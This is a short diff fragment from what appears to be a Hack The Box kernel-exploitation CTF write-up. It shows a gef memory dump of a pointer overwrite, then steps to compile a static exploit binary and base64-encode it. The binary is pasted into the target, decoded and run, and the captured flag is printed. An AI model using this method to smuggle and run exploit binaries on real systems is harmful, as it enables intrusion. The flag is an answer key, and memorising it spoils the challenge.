@@ -73,4 +73,20 @@ gef➤  x/s 0xffff88800008c290
 0xffff88800008c290:     "fdsafdsafdsafdsa.init.text"
 
 "fdsafdsafdsafdsa" is stored in the current structure (overwriting the pointer to "asdf")
+
+x86_64-linux-musl-gcc -o solve -static ../solve.c
+gzip solve
+cat solve.gz | base64 > output.txt
+
+edit output.txt add echo and >> b64
+
+cat b64|base64 -d > e.gz
+gunzip e.gz
+chmod +x e
+./e
+
+paste all the command one time
+
+cat /flag
+HTB{2cdbf36398470b5428ea991d18502ef2}
 '''
